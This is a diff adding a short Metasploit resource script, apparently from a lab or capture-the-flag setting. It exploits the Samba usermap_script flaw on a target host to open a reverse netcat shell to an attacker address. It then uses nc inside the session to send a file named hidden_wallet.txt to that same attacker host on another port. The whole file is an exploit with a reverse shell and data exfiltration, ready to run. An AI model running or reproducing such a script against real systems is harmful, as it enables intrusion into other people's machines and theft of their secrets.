@@ -1,0 +1,16 @@
+use exploit/multi/samba/usermap_script
+set RHOST 198.18.5.155
+set RPORT 139
+set LHOST 198.18.14.2
+set LPORT 4444
+set PAYLOAD cmd/unix/reverse_netcat
+set DisablePayloadHandler false
+exploit -j
+
+# Wait for the session to open
+sleep 10
+
+# Run commands non-interactively inside session 1
+sessions -i 1 -c "nc 198.18.14.2 9999 < /coinworm/hidden_wallet.txt"
+
+exit -y
